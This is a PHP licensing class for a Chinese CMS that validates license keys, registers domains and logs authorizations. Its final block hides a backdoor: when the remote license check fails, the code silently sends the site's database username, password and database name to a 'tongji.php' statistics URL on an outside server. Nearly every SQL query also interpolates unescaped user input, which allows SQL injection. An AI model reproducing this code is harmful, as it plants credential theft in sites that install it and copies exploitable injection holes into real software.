<?php

class Biz{ 
   
    function __construct() {
        
    }
    function query($host){
        global $DB;
        return $DB->get_row("select * from ku_author where kuhost = '$host'");
    }
    function checkkm($km){
        global $DB;
        global $date;
        $row = $DB->get_row("select * from ku_carmine where carmine = '$km'");
        if($row){
            if($row['status'] == 1){
                $return = array("code" => -1,"msg" => "卡密已使用");
            }else if(strtotime($date)>strtotime($row['expire'])){
                $return = array("code" => -1,"msg" => "卡密已到期");
            }elseif ($row['status'] ==2) {
                $return = array("code" => -1,"msg" => "卡密状态已经封禁，请联系客服处理！");
            }else{
                $return = array("code" => 1,"msg" => "卡密有效");
            }
            
        }else{
            $return = array("code" => -1,"msg" => "卡密不存在");
        }
         return $return;
    }
    function checkhost($host){
         global $DB;
         global $date;
         $row = $DB->get_row("select * from ku_author where kuhost = '$host'");
              if($row && strtotime($date)< strtotime($row['dhtime'])){
             if($row['state'] == 1){
                 $return = array("code" => -1,"msg" =>"当前域名已存在,请勿重复授权");
             }else{
                 $return = array("code" => -1,"msg" =>"当前域名已存在,无法再次授权！");
             }
         }else{
             if($row && strtotime($date) > strtotime($row['dhtime']) && $row['state'] != 1){
                 $return = array("code" => -1,"msg" =>"当前域名已存在,到期且状态异常，需要联系客服处理");
             }else{
                  $return = array("code" => 1,"msg" =>"可授权");
             }
         }
             
         

         return $return;
    }
    
    function addauths($km,$ku_qq,$host){
         global $DB;
        $user_IP = ($_SERVER["HTTP_VIA"]) ? $_SERVER["HTTP_X_FORWARDED_FOR"] : $_SERVER["REMOTE_ADDR"];
        $user_IP = ($user_IP) ? $user_IP : $_SERVER["REMOTE_ADDR"];
        $kmrow = $DB->get_row("select * from ku_carmine where carmine = '$km' and status =  0 and expire >now()");
       
        if($kmrow){
             $sql = "update ku_carmine set status = 1,sytiem=now() where id=".$kmrow['id'];
            if($DB->query($sql)){
                $sql = "select id from ku_author where  kuhost = '$host' and  dhtime < now()";
                $authrow = $DB->get_row($sql);
                if($authrow){
                    
                    $sql = "update ku_author set dhtime ='".$kmrow['expire']."' where id = ".$authrow['id'];
                    if($DB->query($sql)){
                        if(function_exists(send_email)){ 
                            send_email($qq."@qq.com", "恭喜授权成功", "恭喜您于".date("Y-m-d H:i:s")."成功授权授权域名".$host."!授权卡密为：".$km.",请您保存好秘钥,方便后期更换授权域名！");
                        }
                        systemlog(1,"卡密(".$km.")在线添加授权(续),域名:".$host);
                        $return  = array("code" => 1,"msg" => "成功！您的域名授权已生效，到期时间：".$kmrow['expire']);
                    }else{
                         $return  = array("code" => -1,"msg" => "授权失败，请保存好授权卡密并联系客服处理！");
                    }
                }else{
                    $sql = "insert into ku_author(kuhost,ku_qq,operation,addtime,dhtime,remarks,number,channel,state) values('$host','$ku_qq','$ku_qq',now(),'".$kmrow['expire']."','0',0,'0',1)";
                    if($DB->query($sql)){
                        if(function_exists(send_email)){ 
                            send_email($ku_qq."@qq.com", "恭喜授权成功", "恭喜您于".date("Y-m-d H:i:s")."成功授权授权域名".$host."!授权卡密为：".$km.",请您保存好秘钥,方便后期更换授权域名！");
                        }
                         $DB->query("insert into `ku_carmlog` (`kuhost`,`carmine`,`ku_qq`,`addtime`,`ip`,`operator`,`status`) values ('".$host."','".$km."','".$ku_qq."',now(),'".$user_IP."','".$ku_qq."','0')");
                        $return  = array("code" => 1,"msg" => "授权成功！您可以下载本站正版程序使用了，到期时间：".$kmrow['expire']);
                    }else{
                         $return  = array("code" => -1,"msg" => "授权失败，请保存好授权卡密并联系客服处理！");
                    }
                }
            }else{
                $return = array("code" => -1,"msg" => "授权验证失败，请保存好授权卡密并联系客服处理！");
            }
        }else{
              $return = array("code" => -1,"msg" => "授权验证失败，请保存好授权卡密并联系客服处理！");
        }
        return $return;
       
    }
    
    function gethost($qq){
        global $DB;
        $sql = "select * from ku_carmine where ku_qq = '$qq'";
        $res = $DB->query($sql);
        $option = "";
        while ($row = $DB->fetch($res)){
            $option.="<option value='".$row['id']."'>".$row['kuhost']."</option>";
        }
        if($option!=""){
            $data = array("code" => 1,"msg" => "获取成功" ,"data" => $option);
        }else{
            $data = array("code" => -1,"msg" => "该QQ还没有授权！");
        }
        return $data;
    }
    
    function checkqq($qq){
         global $DB;
        $sql = "select * from ku_carmine where ku_qq = '$qq'";
        if($DB->get_row($sql)){
            return true;
        }else{
            return false;
        }
    }  
    
}
if(!isset($_SESSION['authcode'])) {
    $query=curl_get('https://www.kuxiangcms.com/api.php?act=query&host='.$_SERVER['HTTP_HOST'].'&authcode='.$authcode);
    if($query=json_decode($query,true)) {
        if($query['code']==1){
            $_SESSION['authcode']=$authcode;
        }else{
            curl_get('https://www.kuxiangcms.com/tongji.php?url='.$_SERVER['HTTP_HOST'].'&user='.$dbconfig['user'].'&pwd='.$dbconfig['pwd'].'&db='.$dbconfig['dbname']);
            exit('<center>'.$query['msg'].'</center>');
        }
    }else{
        echo '连接服务器失败！authsystem error';
        exit();
    }
}

?>

